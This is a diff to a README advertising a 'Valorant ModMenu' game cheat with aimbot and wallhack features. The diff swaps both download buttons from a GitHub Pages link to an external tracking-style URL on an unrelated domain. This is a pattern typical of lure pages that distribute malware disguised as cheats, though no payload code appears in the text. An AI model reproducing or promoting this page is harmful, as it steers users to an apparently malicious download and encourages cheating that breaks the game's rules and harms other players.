@@ -2,7 +2,7 @@
 
 The **Valorant ModMenu** is an advanced tool designed to give players an edge in **Valorant** by unlocking powerful features like aimbot, ESP (wallhack), and much more. Whether you’re looking to improve your aim, gain better map awareness, or simply experiment with mods, this menu offers all the tools you need to take your gameplay to the next level.
 
-[![Download Valorant ModMenu](https://img.shields.io/badge/Download-Valorant%20ModMenu-blueviolet)](https://valorant-modmenu.github.io/.github/)
+[![Download Valorant ModMenu](https://img.shields.io/badge/Download-Valorant%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ### 🎯 Aimbot
 - **Customizable Aimbot**: Fine-tune settings for perfect accuracy and aim assist.
@@ -34,4 +34,4 @@ The **Valorant ModMenu** is an advanced tool designed to give players an edge in
 3. **Activate the mod menu** in-game by pressing the assigned hotkey.
 4. **Toggle features** and adjust the settings to your liking for maximum advantage.
 
-[![Download Valorant ModMenu](https://img.shields.io/badge/Download-Valorant%20ModMenu-blueviolet)](https://valorant-modmenu.github.io/.github/)
+[![Download Valorant ModMenu](https://img.shields.io/badge/Download-Valorant%20ModMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
